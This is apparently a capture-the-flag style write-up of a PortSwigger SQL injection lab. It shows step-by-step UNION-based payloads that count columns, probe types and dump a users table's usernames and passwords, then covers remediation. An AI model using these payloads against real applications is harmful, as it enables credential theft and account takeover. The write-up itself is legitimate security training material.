# SQL injection UNION attack, retrieving data from other tables

**Category:** SQL injection
**Level:** Practitioner
**Mechanism:** UNION-based data exfiltration from a different table

**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

## Vulnerability

The product category filter is injectable and reflects query results, so a `UNION`
attack can append rows from **any readable table** to the response. Here the goal is the
`users` table (`username`, `password`), which the injected query reads and renders
straight into the product list — turning a catalog filter into credential theft.

## Reconnaissance & Exploitation

This chains the two previous labs: find the column count, find a text column, then
select real data into those columns.

**1. Column count.** I used `ORDER BY` this time (a cleaner alternative to incrementing
`NULL`s): order by an increasing column index until the DB errors on an index that
doesn't exist.

```
category=Gifts' ORDER BY 1--   → 200
category=Gifts' ORDER BY 2--   → 200
category=Gifts' ORDER BY 3--   → 500 Internal Server Error
```

Error at index 3 → the query returns **2 columns** (last valid index).

**2. Column data types.** Put a string literal in each column; a column that accepts a
string is text-compatible.

```
category=Gifts' UNION SELECT 'a',NULL--    → ok
category=Gifts' UNION SELECT 'a','a'--     → ok  → both columns are strings
```

**3. Extract the data.** With 2 string columns confirmed, select the real columns from
`users` into them:

```http
GET /filter?category='UNION SELECT username, password FROM users-- HTTP/2
Host: 0a63003d04d1836c809871bc005e00d8.web-security-academy.net
```

```http
HTTP/2 200 OK
...
wiener         z30dui7etavg3ig8qp8v
carlos         3dc0o1xsdtsj87dvbkgh
administrator  15wpk6j1s5hgausvfjoq
```

The response rendered every username and password. I logged in as `administrator` with
the recovered password — lab solved.

## Impact

Full disclosure of the credentials table from a public search filter, with no
authentication. The attacker reads every user's password (plaintext here) and
immediately takes over the admin account — complete application compromise. UNION-based
injection against a reflected query reads arbitrary tables and columns the DB user can
reach, so the same primitive extracts any sensitive data in the database (PII, tokens,
financial records), not just credentials.

## Remediation

- Parameterised queries (prepared statements) for every query that includes user input;
  the `category` value must be bound, never concatenated.
- Least privilege on the DB account so the web app cannot read unrelated tables like
  `users`.
- Never store passwords in plaintext — salted hashing (bcrypt/argon2) limits the damage
  even if the table leaks.
- Don't reflect raw query output in a way that lets injected UNION rows surface.

## References

- **OWASP:** A03:2021 Injection
- **CWE:** CWE-89 (SQL Injection); CWE-256 (Plaintext Storage of a Password)

## Notes

- Two ways to count columns, both worth knowing:
  - `ORDER BY n--` — increment until it errors; the last working index = column count.
    Works even before you know anything about the column types (used here).
  - `UNION SELECT NULL,NULL,...--` — add NULLs until the error clears (lab 01 method).
- `ORDER BY` is often stealthier/faster because it needs no UNION and one error pinpoints
  the count.
- Full UNION chain = count columns → find a text column → select real data into it. This
  lab is the payoff that the two prior labs set up.
- Secondary finding for a report: passwords stored in **plaintext** — the injection was
  the access path, plaintext storage was what made it instant account takeover.